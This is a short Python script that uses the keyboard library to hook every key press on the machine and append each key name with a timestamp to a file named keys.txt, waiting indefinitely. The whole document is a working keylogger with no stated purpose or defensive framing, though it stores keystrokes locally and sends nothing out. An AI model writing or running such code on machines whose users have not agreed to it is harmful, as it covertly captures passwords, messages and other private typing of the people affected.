import keyboard as kb
from datetime import datetime

def get_key(key):
    """
    Log the pressed key into the keys.txt file.
    """
    filename = 'keys.txt'
    with open(filename,'a') as file:
        file.write(f"{datetime.now()} -> {key.name}\n")

kb.on_press(get_key)
kb.wait()